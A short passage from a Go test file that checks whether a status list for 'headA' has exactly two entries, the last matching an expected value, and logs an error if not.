		if s := f.statuses(headA); len(s) != 2 || s[1] != want {
			t.Errorf("%s: statuses %q, want the second and last to be %q", message, s, want)
		}
	}
}
